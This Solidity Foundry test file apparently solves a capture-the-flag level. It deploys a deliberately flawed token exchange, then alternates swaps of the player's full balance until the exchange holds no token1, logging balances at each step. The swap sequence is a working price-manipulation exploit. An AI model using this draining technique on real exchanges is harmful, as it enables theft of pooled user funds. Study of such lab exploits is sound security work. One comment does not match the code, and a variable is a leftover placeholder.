// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";
import {IERC20} from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexTest is Test {
    Dex dex;
    address token1;
    address token2;
    address player = address(0xBEEF);

    function setUp() public {
        // Deployer (this test contract) owns the Dex
        dex = new Dex();

        // Deploy two tokens; deployer gets the full initial supply (110 each)
        SwappableToken t1 = new SwappableToken(address(dex), "Token1", "TK1", 110);
        SwappableToken t2 = new SwappableToken(address(dex), "Token2", "TK2", 110);
        token1 = address(t1);
        token2 = address(t2);

        dex.setTokens(token1, token2);

        // Fund the Dex with 100 of each (owner-only addLiquidity uses transferFrom,
        // so the owner must approve the Dex first)
        t1.approve(address(dex), 100);
        t2.approve(address(dex), 100);
        dex.addLiquidity(token1, 100);
        dex.addLiquidity(token2, 100);

        // Give the player 10 of each
        t1.transfer(player, 10);
        t2.transfer(player, 10);

        // The player must approve the Dex to spend its tokens.
        // NOTE the weird signature: SwappableToken.approve(owner, spender, amount)
        vm.startPrank(player);
        t1.approve(address(dex), type(uint256).max);
        t2.approve(address(dex), type(uint256).max);
        vm.stopPrank();
    }

    function test_DrainDex() public {
        vm.startPrank(player);
        _logState("start");

        dex.swap(token1, token2, 10);  _logState("swap1");
        dex.swap(token2, token1, dex.balanceOf(token2, player)); _logState("swap2");
        dex.swap(token1, token2, dex.balanceOf(token1, player)); _logState("swap3");
        dex.swap(token2, token1, dex.balanceOf(token2, player)); _logState("swap4");
        dex.swap(token1, token2, dex.balanceOf(token1, player)); _logState("swap5");

        // final swap: compute exact amount to take the rest of token1
        uint256 dexT1 = dex.balanceOf(token1, address(dex));
        uint256 dexT2 = dex.balanceOf(token2, address(dex));
        uint256 exact = (dexT1 * dexT2) / dexT2; // placeholder — see note below
        // The exact input to drain token1: x such that (x * dexT1)/dexT2 == dexT1  => x = dexT2
        dex.swap(token2, token1, dexT2);  _logState("final");

        vm.stopPrank();
        assertEq(dex.balanceOf(token1, address(dex)), 0);
    }

    function _logState(string memory label) internal view {
        console.log(label);
        console.log("  Dex:   ", dex.balanceOf(token1, address(dex)), dex.balanceOf(token2, address(dex)));
        console.log("  Player:", dex.balanceOf(token1, player), dex.balanceOf(token2, player));
    }
}